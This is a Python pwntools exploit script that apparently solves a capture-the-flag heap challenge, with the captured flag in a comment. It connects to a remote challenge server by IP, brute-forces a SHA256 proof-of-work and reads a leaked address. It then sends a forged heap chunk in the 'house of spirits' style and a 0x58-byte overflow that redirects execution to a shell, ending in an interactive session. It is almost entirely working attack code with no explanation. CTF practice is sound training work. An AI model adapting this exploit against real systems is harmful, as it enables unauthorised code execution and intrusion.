#flag = flag{seems_h0us3_0f_sp1r1ts_w0rks_0n_2.32_then_58493}
from pwn import *
import hashlib
import string
import sys
from itertools import chain, product


elf = ELF("vuln")
libc = ELF("./libc-2.32.so")
ld = ELF("./ld-2.32.so")

#target = process([elf.path, ld.path], env={"LD_PRELOAD": libc.path})
target = remote('161.97.176.150', 2929)

def computePow(given):
	def generatestr(size=4, chars=string.ascii_lowercase):
		return (''.join(candidate)
			for candidate in chain.from_iterable(product(chars, repeat=i)
				for i in range(1, size+1)))
	
	for s in generatestr():
		m = hashlib.sha256()
		m.update(s)
		d = m.hexdigest()
		if str(d[-6:]) == str(given):
			return s

target.recvuntil("SHA256(X)[-6:] = ")
solution = computePow(target.recv(6))
log.success("String found: " + solution)
target.sendline(solution)

target.recvuntil("0x")
shell = int(target.recvline().strip(), 0x10)
log.info("Shell addr: " + hex(shell))

fake_chunk = p64(0) + p64(0x41) + "A"*0x38 + p64(0x41)
target.send(fake_chunk)

payload = "A"*0x58 + p64(shell)
target.sendline(payload)

target.interactive()
